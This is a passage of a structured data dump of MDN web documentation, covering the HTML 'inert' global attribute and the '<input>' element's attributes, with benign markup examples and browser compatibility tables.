  summary: Since April 2023, this feature works across the latest devices and browser versions
  description: "# inert\n\n## Baseline 2023\n\nNewly available\n\nSince April 2023, this feature works across the latest devices and browser versions. This feature might not work in older devices or browsers.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FGlobal_attributes%2Finert&level=low)\n\nThe `inert` [global attribute](../global_attributes) is a Boolean attribute indicating that the browser will ignore the element. With the `inert` attribute, all of the element's flat tree descendants (such as modal [`<dialog>`](../element/dialog)s) that don't otherwise escape inertness are ignored. The `inert` attribute also makes the browser ignore input events sent by the user, including focus-related events and events from assistive technologies.\n\nSpecifically, `inert` does the following:\n\n- Prevents the [`click`](https://developer.mozilla.org/en-US/docs/Web/API/Element/click_event) event from being fired when the user clicks on the element.\n- Prevents the [`focus`](https://developer.mozilla.org/en-US/docs/Web/API/Element/focus_event) event from being raised by preventing the element from gaining focus.\n- Prevents any contents of the element from being found/matched during any use of the browser's find-in-page feature.\n- Prevents users from selecting text within the element — akin to using the CSS property [`user-select`](https://developer.mozilla.org/en-US/docs/Web/CSS/user-select) to disable text selection.\n- Prevents users from editing any contents of the element that are otherwise editable.\n- Hides the element and its content from assistive technologies by excluding them from the accessibility tree.\n\nhtml\n\n```\n<div inert>\n  <!-- content -->\n</div>\n```\n\nThe `inert` attribute can be added to sections of content that should not be interactive. When an element is inert, it along with all of the element's descendants, including normally interactive elements such as links, buttons, and form controls are disabled because they cannot receive focus or be clicked.\n\nThe `inert` attribute can also be added to elements that should be offscreen or hidden. An inert element, along with its descendants, gets removed from the tab order and accessibility tree.\n\n**Note:** While `inert` is a global attribute and can be applied to any element, it is generally used for sections of content. To make individual controls \"inert\", consider using the [`disabled`](../attributes/disabled) attribute, along with CSS [`:disabled`](https://developer.mozilla.org/en-US/docs/Web/CSS/:disabled) styles, instead.\n\n## Accessibility concerns\n\nUse careful consideration for accessibility when applying the `inert` attribute. By default, there is no visual way to tell whether or not an element or its subtree is inert. As a web developer, it is your responsibility to clearly indicate the content parts that are active and those that are inert.\n\nWhile providing visual and non-visual cues about content inertness, also remember that the visual viewport may contain only sections of content. Users may be zoomed in to a small section of content, or users may not be able to view the content at all. Inert sections not being obviously inert can lead to frustration and bad user experience.\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|         | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|---------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|         | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `inert` | 102     | 102  | 112     | 88    | 15.5   | 102            | 112                 | 70            | 15.5          | 19.0             | 102             |     |\n\n## See also\n\n- HTML [`<dialog>`](../element/dialog) element\n- [`HTMLElement.inert`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/inert) HTML DOM property\n- [Introducing inert](https://web.dev/articles/inert)\n- [The \"inert\" attribute is finally coming to the web](https://www.stefanjudis.com/blog/the-inert-attribute-is-finally-coming-to-the-web/)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/inert](https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/inert)"
- name: input
  summary: The <input> HTML element is used to create interactive controls for web-based forms in order to accept data from the user; a wide variety of types of input data and control widgets are available, depending on the device and user agent
  description: "# \\<input\\>: The Input (Form Input) element\n\nThe `<input>` [HTML](../index) element is used to create interactive controls for web-based forms in order to accept data from the user; a wide variety of types of input data and control widgets are available, depending on the device and [user agent](https://developer.mozilla.org/en-US/docs/Glossary/User_agent). The `<input>` element is one of the most powerful and complex in all of HTML due to the sheer number of combinations of input types and attributes.\n\n## Try it\n\n#### HTML Demo: \\<input type=\"text\"\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <label for=\"name\">Name (4 to 8 characters):</label>\n\n    <input type=\"text\" id=\"name\" name=\"name\" required minlength=\"4\" maxlength=\"8\" size=\"10\" />\n\n    label {\n      display: block;\n      font:\n        1rem 'Fira Sans',\n        sans-serif;\n    }\n\n    input,\n    label {\n      margin: 0.4rem 0;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## \\<input\\> types\n\nHow an `<input>` works varies considerably depending on the value of its [`type`](#type) attribute, hence the different types are covered in their own separate reference pages. If this attribute is not specified, the default type adopted is `text`.\n\nThe available types are as follows:\n\n[TABLE]\n\n## Attributes\n\nThe `<input>` element is so powerful because of its attributes; the [`type`](#type) attribute, described with examples above, being the most important. Since every `<input>` element, regardless of type, is based on the [`HTMLInputElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement) interface, they technically share the exact same set of attributes. However, in reality, most attributes have an effect on only a specific subset of input types. In addition, the way some attributes impact an input depends on the input type, impacting different input types in different ways.\n\nThis section provides a table listing all the attributes with a brief description. This table is followed by a list describing each attribute in greater detail, along with which input types they are associated with. Those that are common to most or all input types are defined in greater detail below. Attributes that are unique to particular input types—or attributes which are common to all input types but have special behaviors when used on a given input type—are instead documented on those types' pages.\n\nAttributes for the `<input>` element include the [global HTML attributes](../global_attributes) and additionally:\n\n| Attribute                                     | Type(s)                                                                 | Description                                                                            |\n|-----------------------------------------------|-------------------------------------------------------------------------|----------------------------------------------------------------------------------------|\n| [`accept`](#accept)                           | `file`                                                                  | Hint for expected file type in file upload controls                                    |\n| [`alt`](#alt)                                 | `image`                                                                 | alt attribute for the image type. Required for accessibility                           |\n| [`autocapitalize`](#autocapitalize)           | all except `url`, `email`, and `password`                               | Controls automatic capitalization in inputted text.                                    |\n| [`autocomplete`](#autocomplete)               | all except `checkbox`, `radio`, and buttons                             | Hint for form autofill feature                                                         |\n| [`capture`](#capture)                         | `file`                                                                  | Media capture input method in file upload controls                                     |\n| [`checked`](#checked)                         | `checkbox`, `radio`                                                     | Whether the command or control is checked                                              |\n| [`dirname`](#dirname)                         | `hidden`, `text`, `search`, `url`, `tel`, `email`                       | Name of form field to use for sending the element's directionality in form submission  |\n| [`disabled`](#disabled)                       | all                                                                     | Whether the form control is disabled                                                   |\n| [`form`](#form)                               | all                                                                     | Associates the control with a form element                                             |\n| [`formaction`](#formaction)                   | `image`, `submit`                                                       | URL to use for form submission                                                         |\n| [`formenctype`](#formenctype)                 | `image`, `submit`                                                       | Form data set encoding type to use for form submission                                 |\n| [`formmethod`](#formmethod)                   | `image`, `submit`                                                       | HTTP method to use for form submission                                                 |\n| [`formnovalidate`](#formnovalidate)           | `image`, `submit`                                                       | Bypass form control validation for form submission                                     |\n| [`formtarget`](#formtarget)                   | `image`, `submit`                                                       | Browsing context for form submission                                                   |\n| [`height`](#height)                           | `image`                                                                 | Same as height attribute for [`<img>`](img); vertical dimension                        |\n| [`list`](#list)                               | all except `hidden`, `password`, `checkbox`, `radio`, and buttons       | Value of the id attribute of the [`<datalist>`](datalist) of autocomplete options      |\n| [`max`](#max)                                 | `date`, `month`, `week`, `time`, `datetime-local`, `number`, `range`    | Maximum value                                                                          |\n| [`maxlength`](#maxlength)                     | `text`, `search`, `url`, `tel`, `email`, `password`                     | Maximum length (number of characters) of `value`                                       |\n| [`min`](#min)                                 | `date`, `month`, `week`, `time`, `datetime-local`, `number`, `range`    | Minimum value                                                                          |\n| [`minlength`](#minlength)                     | `text`, `search`, `url`, `tel`, `email`, `password`                     | Minimum length (number of characters) of `value`                                       |\n| [`multiple`](#multiple)                       | `email`, `file`                                                         | Boolean. Whether to allow multiple values                                              |\n| [`name`](#name)                               | all                                                                     | Name of the form control. Submitted with the form as part of a name/value pair         |\n| [`pattern`](#pattern)                         | `text`, `search`, `url`, `tel`, `email`, `password`                     | Pattern the `value` must match to be valid                                             |\n| [`placeholder`](#placeholder)                 | `text`, `search`, `url`, `tel`, `email`, `password`, `number`           | Text that appears in the form control when it has no value set                         |\n| [`popovertarget`](#popovertarget)             | `button`                                                                | Designates an `<input type=\"button\">` as a control for a popover element               |\n| [`popovertargetaction`](#popovertargetaction) | `button`                                                                | Specifies the action that a popover control should perform                             |\n| [`readonly`](#readonly)                       | all except `hidden`, `range`, `color`, `checkbox`, `radio`, and buttons | Boolean. The value is not editable                                                     |\n| [`required`](#required)                       | all except `hidden`, `range`, `color`, and buttons                      | Boolean. A value is required or must be checked for the form to be submittable         |\n| [`size`](#size)                               | `text`, `search`, `url`, `tel`, `email`, `password`                     | Size of the control                                                                    |\n| [`src`](#src)                                 | `image`                                                                 | Same as `src` attribute for [`<img>`](img); address of image resource                  |\n| [`step`](#step)                               | `date`, `month`, `week`, `time`, `datetime-local`, `number`, `range`    | Incremental values that are valid                                                      |\n| [`type`](#type)                               | all                                                                     | Type of form control                                                                   |\n| [`value`](#value)                             | all except `image`                                                      | The value of the control. When specified in the HTML, corresponds to the initial value |\n| [`width`](#width)                             | `image`                                                                 | Same as `width` attribute for [`<img>`](img)                                           |\n\nA few additional non-standard attributes are listed following the descriptions of the standard attributes.\n\n### Individual attributes\n\n[`accept`](../attributes/accept)  \nValid for the `file` input type only, the `accept` attribute defines which file types are selectable in a `file` upload control. See the [file](input/file) input type.\n\n[`alt`](#alt)  \nValid for the `image` button only, the `alt` attribute provides alternative text for the image, displaying the value of the attribute if the image [`src`](#src) is missing or otherwise fails to load. See the [image](input/image) input type.\n\n[`autocapitalize`](#autocapitalize)  \nControls whether inputted text is automatically capitalized and, if so, in what manner. See the [`autocapitalize`](../global_attributes/autocapitalize) global attribute page for more information.\n\n[`autocomplete`](../attributes/autocomplete)  \n(**Not** a Boolean attribute!) The [`autocomplete`](../attributes/autocomplete) attribute takes as its value a space-separated string that describes what, if any, type of autocomplete functionality the input should provide. A typical implementation of autocomplete recalls previous values entered in the same input field, but more complex forms of autocomplete can exist. For instance, a browser could integrate with a device's contacts list to autocomplete `email` addresses in an email input field. See [`autocomplete`](../attributes/autocomplete#values) for permitted values.\n\nThe `autocomplete` attribute is valid on `hidden`, `text`, `search`, `url`, `tel`, `email`, `date`, `month`, `week`, `time`, `datetime-local`, `number`, `range`, `color`, and `password`. This attribute has no effect on input types that do not return numeric or text data, being valid for all input types except `checkbox`, `radio`, `file`, or any of the button types.\n\nSee the [`autocomplete` attribute](../attributes/autocomplete) for additional information, including information on password security and how `autocomplete` is slightly different for `hidden` than for other input types.\n\n[`autofocus`](#autofocus)  \nA Boolean attribute which, if present, indicates that the input should automatically have focus when the page has finished loading (or when the [`<dialog>`](dialog) containing the element has been displayed).\n\n**Note:** An element with the `autofocus` attribute may gain focus before the [`DOMContentLoaded`](https://developer.mozilla.org/en-US/docs/Web/API/Document/DOMContentLoaded_event) event is fired.\n\nNo more than one element in the document may have the `autofocus` attribute. If put on more than one element, the first one with the attribute receives focus.\n\nThe `autofocus` attribute cannot be used on inputs of type `hidden`, since hidden inputs cannot be focused.\n\n**Warning:** Automatically focusing a form control can confuse visually-impaired people using screen-reading technology and people with cognitive impairments. When `autofocus` is assigned, screen-readers \"teleport\" their user to the form control without warning them beforehand.\n\nUse careful consideration for accessibility when applying the `autofocus` attribute. Automatically focusing on a control can cause the page to scroll on load. The focus can also cause dynamic keyboards to display on some touch devices. While a screen reader will announce the label of the form control receiving focus, the screen reader will not announce anything before the label, and the sighted user on a small device will equally miss the context created by the preceding content.\n\n[`capture`](../attributes/capture)  \nIntroduced in the HTML Media Capture specification and valid for the `file` input type only, the `capture` attribute defines which media—microphone, video, or camera—should be used to capture a new file for upload with `file` upload control in supporting scenarios. See the [file](input/file) input type.\n\n[`checked`](#checked)  \nValid for both `radio` and `checkbox` types, `checked` is a Boolean attribute. If present on a `radio` type, it indicates that the radio button is the currently selected one in the group of same-named radio buttons. If present on a `checkbox` type, it indicates that the checkbox is checked by default (when the page loads). It does *not* indicate whether this checkbox is currently checked: if the checkbox's state is changed, this content attribute does not reflect the change. (Only the [`HTMLInputElement`'s `checked` IDL attribute](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement) is updated.)\n\n**Note:** Unlike other input controls, a checkboxes and radio buttons value are only included in the submitted data if they are currently `checked`. If they are, the name and the value(s) of the checked controls are submitted.\n\nFor example, if a checkbox whose `name` is `fruit` has a `value` of `cherry`, and the checkbox is checked, the form data submitted will include `fruit=cherry`. If the checkbox isn't active, it isn't listed in the form data at all. The default `value` for checkboxes and radio buttons is `on`.\n\n[`dirname`](../attributes/dirname)  \nValid for `hidden`, `text`, `search`, `url`, `tel`, and `email` input types, the `dirname` attribute enables the submission of the directionality of the element. When included, the form control will submit with two name/value pairs: the first being the [`name`](#name) and [`value`](#value), and the second being the value of the `dirname` attribute as the name, with a value of `ltr` or `rtl` as set by the browser.\n\nhtml\n\n```\n<form action=\"page.html\" method=\"post\">\n  <label>\n    Fruit:\n    <input type=\"text\" name=\"fruit\" dirname=\"fruit-dir\" value=\"cherry\" />\n  </label>\n  <input type=\"submit\" />\n</form>\n<!-- page.html?fruit=cherry&fruit-dir=ltr -->\n```\n\nWhen the form above is submitted, the input cause both the `name` / `value` pair of `fruit=cherry` and the `dirname` / direction pair of `fruit-dir=ltr` to be sent. For more information, see the [`dirname` attribute](../attributes/dirname).\n\n[`disabled`](../attributes/disabled)  \nA Boolean attribute which, if present, indicates that the user should not be able to interact with the input. Disabled inputs are typically rendered with a dimmer color or using some other form of indication that the field is not available for use.\n\nSpecifically, disabled inputs do not receive the [`click`](https://developer.mozilla.org/en-US/docs/Web/API/Element/click_event) event, and disabled inputs are not submitted with the form.\n\n**Note:** Although not required by the specification, Firefox will by default [persist the dynamic disabled state](https://stackoverflow.com/questions/5985839/bug-with-firefox-disabled-attribute-of-input-not-resetting-when-refreshing) of an `<input>` across page loads. Use the [`autocomplete`](#autocomplete) attribute to control this feature.\n\n[`form`](#form)  \nA string specifying the [`<form>`](form) element with which the input is associated (that is, its **form owner**). This string's value, if present, must match the [`id`](#id) of a `<form>` element in the same document. If this attribute isn't specified, the `<input>` element is associated with the nearest containing form, if any.\n\nThe `form` attribute lets you place an input anywhere in the document but have it included with a form elsewhere in the document.\n\n**Note:** An input can only be associated with one form.\n\n[`formaction`](#formaction)  \nValid for the `image` and `submit` input types only. See the [submit](input/submit) input type for more information.\n\n[`formenctype`](#formenctype)  \nValid for the `image` and `submit` input types only. See the [submit](input/submit) input type for more information.\n\n[`formmethod`](#formmethod)  \nValid for the `image` and `submit` input types only. See the [submit](input/submit) input type for more information.\n\n[`formnovalidate`](#formnovalidate)  \nValid for the `image` and `submit` input types only. See the [submit](input/submit) input type for more information.\n\n[`formtarget`](#formtarget)  \nValid for the `image` and `submit` input types only. See the [submit](input/submit) input type for more information.\n\n[`height`](#height)  \nValid for the `image` input button only, the `height` is the height of the image file to display to represent the graphical submit button. See the [image](input/image) input type.\n\n[`id`](#id)  \nGlobal attribute valid for all elements, including all the input types, it defines a unique identifier (ID) which must be unique in the whole document. Its purpose is to identify the element when linking. The value is used as the value of the [`<label>`](label)'s `for` attribute to link the label with the form control. See [`<label>`](label).\n\n[`inputmode`](#inputmode)  \nGlobal value valid for all elements, it provides a hint to browsers as to the type of virtual keyboard configuration to use when editing this element or its contents. Values include `none`, `text`, `tel`, `url`, `email`, `numeric`, `decimal`, and `search`.\n\n[`list`](#list)  \nThe value given to the `list` attribute should be the [`id`](https://developer.mozilla.org/en-US/docs/Web/API/Element/id) of a [`<datalist>`](datalist) element located in the same document. The `<datalist>` provides a list of predefined values to suggest to the user for this input. Any values in the list that are not compatible with the [`type`](#type) are not included in the suggested options. The values provided are suggestions, not requirements: users can select from this predefined list or provide a different value.\n\nIt is valid on `text`, `search`, `url`, `tel`, `email`, `date`, `month`, `week`, `time`, `datetime-local`, `number`, `range`, and `color`.\n\nPer the specifications, the `list` attribute is not supported by the `hidden`, `password`, `checkbox`, `radio`, `file`, or any of the button types.\n\nDepending on the browser, the user may see a custom color palette suggested, tic marks along a range, or even an input that opens like a [`<select>`](select) but allows for non-listed values. Check out the [browser compatibility table](datalist#browser_compatibility) for the other input types.\n\nSee the [`<datalist>`](datalist) element.\n\n[`max`](../attributes/max)  \nValid for `date`, `month`, `week`, `time`, `datetime-local`, `number`, and `range`, it defines the greatest value in the range of permitted values. If the [`value`](#value) entered into the element exceeds this, the element fails [constraint validation](../constraint_validation). If the value of the `max` attribute isn't a number, then the element has no maximum value.\n\nThere is a special case: if the data type is periodic (such as for dates or times), the value of `max` may be lower than the value of `min`, which indicates that the range may wrap around; for example, this allows you to specify a time range from 10 PM to 4 AM.\n\n[`maxlength`](../attributes/maxlength)  \nValid for `text`, `search`, `url`, `tel`, `email`, and `password`, it defines the maximum string length (measured in UTF-16 code units) that the user can enter into the field. This must be an integer value of 0 or higher. If no `maxlength` is specified, or an invalid value is specified, the field has no maximum length. This value must also be greater than or equal to the value of `minlength`.\n\nThe input will fail [constraint validation](../constraint_validation) if the length of the text entered into the field is greater than `maxlength` UTF-16 code units long. By default, browsers prevent users from entering more characters than allowed by the `maxlength` attribute. Constraint validation is only applied when the value is changed by the user. See [Client-side validation](#client-side_validation) for more information.\n\n[`min`](../attributes/min)  \nValid for `date`, `month`, `week`, `time`, `datetime-local`, `number`, and `range`, it defines the most negative value in the range of permitted values. If the [`value`](#value) entered into the element is less than this, the element fails [constraint validation](../constraint_validation). If the value of the `min` attribute isn't a number, then the element has no minimum value.\n\nThis value must be less than or equal to the value of the `max` attribute. If the `min` attribute is present but is not specified or is invalid, no `min` value is applied. If the `min` attribute is valid and a non-empty value is less than the minimum allowed by the `min` attribute, constraint validation will prevent form submission. See [Client-side validation](#client-side_validation) for more information.\n\nThere is a special case: if the data type is periodic (such as for dates or times), the value of `max` may be lower than the value of `min`, which indicates that the range may wrap around; for example, this allows you to specify a time range from 10 PM to 4 AM.\n\n[`minlength`](../attributes/minlength)  \nValid for `text`, `search`, `url`, `tel`, `email`, and `password`, it defines the minimum string length (measured in UTF-16 code units) that the user can enter into the entry field. This must be a non-negative integer value smaller than or equal to the value specified by `maxlength`. If no `minlength` is specified, or an invalid value is specified, the input has no minimum length.\n\nThe input will fail [constraint validation](../constraint_validation) if the length of the text entered into the field is fewer than `minlength` UTF-16 code units long, preventing form submission. Constraint validation is only applied when the value is changed by the user. See [Client-side validation](#client-side_validation) for more information.\n\n[`multiple`](../attributes/multiple)  \nThe Boolean `multiple` attribute, if set, means the user can enter comma separated email addresses in the email widget or can choose more than one file with the `file` input. See the [email](input/email) and [file](input/file) input type.\n\n[`name`](#name)  \nA string specifying a name for the input control. This name is submitted along with the control's value when the form data is submitted.\n\nConsider the `name` a required attribute (even though it's not). If an input has no `name` specified, or `name` is empty, the input's value is not submitted with the form! (Disabled controls, unchecked radio buttons, unchecked checkboxes, and reset buttons are also not sent.)\n\nThere are two special cases:\n\n1.  `_charset_` : If used as the name of an `<input>` element of type [hidden](input/hidden), the input's `value` is automatically set by the [user agent](https://developer.mozilla.org/en-US/docs/Glossary/User_agent) to the character encoding being used to submit the form.\n2.  `isindex`: For historical reasons, the name [`isindex`](https://html.spec.whatwg.org/multipage/form-control-infrastructure.html#attr-fe-name) is not allowed.\n\nThe [`name`](#name) attribute creates a unique behavior for radio buttons.\n\nOnly one radio button in a same-named group of radio buttons can be checked at a time. Selecting any radio button in that group automatically deselects any currently-selected radio button in the same group. The value of that one checked radio button is sent along with the name if the form is submitted,\n\nWhen tabbing into a series of same-named group of radio buttons, if one is checked, that one will receive focus. If they aren't grouped together in source order, if one of the group is checked, tabbing into the group starts when the first one in the group is encountered, skipping all those that aren't checked. In other words, if one is checked, tabbing skips the unchecked radio buttons in the group. If none are checked, the radio button group receives focus when the first button in the same name group is reached.\n\nOnce one of the radio buttons in a group has focus, using the arrow keys will navigate through all the radio buttons of the same name, even if the radio buttons are not grouped together in the source order.\n\nWhen an input element is given a `name`, that name becomes a property of the owning form element's [`HTMLFormElement.elements`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLFormElement/elements) property. If you have an input whose `name` is set to `guest` and another whose `name` is `hat-size`, the following code can be used:\n\njs\n\n```\nlet form = document.querySelector(\"form\");\n\nlet guestName = form.elements.guest;\nlet hatSize = form.elements[\"hat-size\"];\n```\n\nWhen this code has run, `guestName` will be the [`HTMLInputElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement) for the `guest` field, and `hatSize` the object for the `hat-size` field.\n\n**Warning:** Avoid giving form elements a `name` that corresponds to a built-in property of the form, since you would then override the predefined property or method with this reference to the corresponding input.\n\n[`pattern`](../attributes/pattern)  \nValid for `text`, `search`, `url`, `tel`, `email`, and `password`, the `pattern` attribute defines a regular expression that the input's [`value`](#value) must match in order for the value to pass [constraint validation](../constraint_validation). It must be a valid JavaScript regular expression, as used by the [`RegExp`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/RegExp) type, and as documented in our [guide on regular expressions](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Regular_expressions); the `'u'` flag is specified when compiling the regular expression, so that the pattern is treated as a sequence of Unicode code points, instead of as [ASCII](https://developer.mozilla.org/en-US/docs/Glossary/ASCII). No forward slashes should be specified around the pattern text.\n\nIf the `pattern` attribute is present but is not specified or is invalid, no regular expression is applied and this attribute is ignored completely. If the pattern attribute is valid and a non-empty value does not match the pattern, constraint validation will prevent form submission.\n\n**Note:** If using the `pattern` attribute, inform the user about the expected format by including explanatory text nearby. You can also include a [`title`](#title) attribute to explain what the requirements are to match the pattern; most browsers will display this title as a tooltip. The visible explanation is required for accessibility. The tooltip is an enhancement.\n\nSee [Client-side validation](#client-side_validation) for more information.\n\n[`placeholder`](../attributes/placeholder)  \nValid for `text`, `search`, `url`, `tel`, `email`, `password`, and `number`, the `placeholder` attribute provides a brief hint to the user as to what kind of information is expected in the field. It should be a word or short phrase that provides a hint as to the expected type of data, rather than an explanation or prompt. The text *must not* include carriage returns or line feeds. So for example if a field is expected to capture a user's first name, and its label is \"First Name\", a suitable placeholder might be \"e.g. Mustafa\".\n\n**Note:** The `placeholder` attribute is not as semantically useful as other ways to explain your form, and can cause unexpected technical issues with your content. See [Labels](#labels) for more information.\n\n[`popovertarget`](#popovertarget)  \nTurns an `<input type=\"button\">` element into a popover control button; takes the ID of the popover element to control as its value. See the [Popover API](https://developer.mozilla.org/en-US/docs/Web/API/Popover_API) landing page for more details.\n\n[`popovertargetaction`](#popovertargetaction)  \nSpecifies the action to be performed on a popover element being controlled by a control `<input type=\"button\">`. Possible values are:\n\n[`\"hide\"`](#hide)  \nThe button will hide a shown popover. If you try to hide an already hidden popover, no action will be taken.\n\n[`\"show\"`](#show)  \nThe button will show a hidden popover. If you try to show an already showing popover, no action will be taken.\n\n[`\"toggle\"`](#toggle)  \nThe button will toggle a popover between showing and hidden. If the popover is hidden, it will be shown; if the popover is showing, it will be hidden. If `popovertargetaction` is omitted, `\"toggle\"` is the default action that will be performed by the control button.\n\n[`readonly`](../attributes/readonly)  \nA Boolean attribute which, if present, indicates that the user should not be able to edit the value of the input. The `readonly` attribute is supported by the `text`, `search`, `url`, `tel`, `email`, `date`, `month`, `week`, `time`, `datetime-local`, `number`, and `password` input types.\n\nSee the [HTML attribute: `readonly`](../attributes/readonly) for more information.\n\n[`required`](../attributes/required)  \n`required` is a Boolean attribute which, if present, indicates that the user must specify a value for the input before the owning form can be submitted. The `required` attribute is supported by `text`, `search`, `url`, `tel`, `email`, `date`, `month`, `week`, `time`, `datetime-local`, `number`, `password`, `checkbox`, `radio`, and `file` inputs.\n\nSee [Client-side validation](#client-side_validation) and the [HTML attribute: `required`](../attributes/required) for more information.\n\n[`size`](../attributes/size)  \nValid for `email`, `password`, `tel`, `url`, and `text`, the `size` attribute specifies how much of the input is shown. Basically creates same result as setting CSS [`width`](https://developer.mozilla.org/en-US/docs/Web/CSS/width) property with a few specialities. The actual unit of the value depends on the input type. For `password` and `text`, it is a number of characters (or `em` units) with a default value of `20`, and for others, it is pixels (or `px` units). CSS `width` takes precedence over the `size` attribute.\n\n[`src`](#src)  \nValid for the `image` input button only, the `src` is string specifying the URL of the image file to display to represent the graphical submit button. See the [image](input/image) input type.\n\n[`step`](../attributes/step)  \nValid for `date`, `month`, `week`, `time`, `datetime-local`, `number`, and `range`, the [`step`](../attributes/step) attribute is a number that specifies the granularity that the value must adhere to.\n\nIf not explicitly included:\n\n- `step` defaults to 1 for `number` and `range`.\n- Each date/time input type has a default `step` value appropriate for the type; see the individual input pages: [`date`](input/date#step), [`datetime-local`](input/datetime-local#step), [`month`](input/month#step), [`time`](input/time#step), and [`week`](input/week#step).\n\nThe value must be a positive number—integer or float—or the special value `any`, which means no stepping is implied, and any value is allowed (barring other constraints, such as [`min`](#min) and [`max`](#max)).\n\nIf `any` is not explicitly set, valid values for the `number`, date/time input types, and `range` input types are equal to the basis for stepping — the [`min`](#min) value and increments of the step value, up to the [`max`](#max) value, if specified.\n\nFor example, if you have `<input type=\"number\" min=\"10\" step=\"2\">`, then any even integer, `10` or greater, is valid. If omitted, `<input type=\"number\">`, any integer is valid, but floats (like `4.2`) are not valid, because `step` defaults to `1`. For `4.2` to be valid, `step` would have had to be set to `any`, 0.1, 0.2, or any the `min` value would have had to be a number ending in `.2`, such as `<input type=\"number\" min=\"-5.2\">`\n\n**Note:** When the data entered by the user doesn't adhere to the stepping configuration, the value is considered invalid in constraint validation and will match the `:invalid` pseudoclass.\n\nSee [Client-side validation](#client-side_validation) for more information.\n\n[`tabindex`](#tabindex)  \nGlobal attribute valid for all elements, including all the input types, an integer attribute indicating if the element can take input focus (is focusable), if it should participate to sequential keyboard navigation. As all input types except for input of type hidden are focusable, this attribute should not be used on form controls, because doing so would require the management of the focus order for all elements within the document with the risk of harming usability and accessibility if done incorrectly.\n\n[`title`](#title)  \nGlobal attribute valid for all elements, including all input types, containing a text representing advisory information related to the element it belongs to. Such information can typically, but not necessarily, be presented to the user as a tooltip. The title should NOT be used as the primary explanation of the purpose of the form control. Instead, use the [`<label>`](label) element with a `for` attribute set to the form control's [`id`](#id) attribute. See [Labels](#labels) below.\n\n[`type`](#type)  \nA string specifying the type of control to render. For example, to create a checkbox, a value of `checkbox` is used. If omitted (or an unknown value is specified), the input type `text` is used, creating a plaintext input field.\n\nPermitted values are listed in [Input types](#input_types) above.\n\n[`value`](#value)  \nThe input control's value. When specified in the HTML, this is the initial value, and from then on it can be altered or retrieved at any time using JavaScript to access the respective [`HTMLInputElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement) object's `value` property. The `value` attribute is always optional, though should be considered mandatory for `checkbox`, `radio`, and `hidden`.\n\n[`width`](#width)  \nValid for the `image` input button only, the `width` is the width of the image file to display to represent the graphical submit button. See the [image](input/image) input type.\n\n### Non-standard attributes\n\nThe following non-standard attributes are also available on some browsers. As a general rule, you should avoid using them unless it can't be helped.\n\n| Attribute                             | Description                                                                                                                                                                                                                                                                                                                  |\n|---------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| [`autocorrect`](#autocorrect)         | A string indicating whether autocorrect is `on` or `off`. **Safari only.**                                                                                                                                                                                                                                                   |\n| [`incremental`](#incremental)         | Whether or not to send repeated [`search`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement/search_event) events to allow updating live search results while the user is still editing the value of the field. **WebKit and Blink only (Safari, Chrome, Opera, etc.).**                                     |\n| `mozactionhint` Deprecated            | A string indicating the type of action that will be taken when the user presses the Enter or Return key while editing the field; this is used to determine an appropriate label for that key on a virtual keyboard. **Since this attribute is deprecated, use [`enterkeyhint`](../global_attributes/enterkeyhint) instead.** |\n| [`orient`](#orient)                   | Sets the orientation of the range slider. **Firefox only**.                                                                                                                                                                                                                                                                  |\n| [`results`](#results)                 | The maximum number of items that should be displayed in the drop-down list of previous search queries. **Safari only.**                                                                                                                                                                                                      |\n| [`webkitdirectory`](#webkitdirectory) | A Boolean indicating whether to only allow the user to choose a directory (or directories, if [`multiple`](#multiple) is also present)                                                                                                                                                                                       |\n\n[`autocorrect`](#autocorrect) Non-standard  \n(Safari only). A string which indicates whether to activate automatic correction while the user is editing this field. Permitted values are:\n\n[`on`](#on)  \nEnable automatic correction of typos, as well as processing of text substitutions if any are configured.\n\n[`off`](#off)  \nDisable automatic correction and text substitutions.\n\n[`incremental`](#incremental) Non-standard  \nThe Boolean attribute `incremental` is a WebKit and Blink extension (so supported by Safari, Opera, Chrome, etc.) which, if present, tells the [user agent](https://developer.mozilla.org/en-US/docs/Glossary/User_agent) to process the input as a live search. As the user edits the value of the field, the user agent sends [`search`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement/search_event) events to the [`HTMLInputElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement) object representing the search box. This allows your code to update the search results in real time as the user edits the search.\n\nIf `incremental` is not specified, the [`search`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement/search_event) event is only sent when the user explicitly initiates a search (such as by pressing the Enter or Return key while editing the field).\n\nThe `search` event is rate-limited so that it is not sent more frequently than an implementation-defined interval.\n\n[`orient`](#orient) Non-standard  \nSimilar to the -moz-orient non-standard CSS property impacting the [`<progress>`](progress) and [`<meter>`](meter) elements, the `orient` attribute defines the orientation of the range slider. Values include `horizontal`, meaning the range is rendered horizontally, and `vertical`, where the range is rendered vertically. See [Creating vertical form 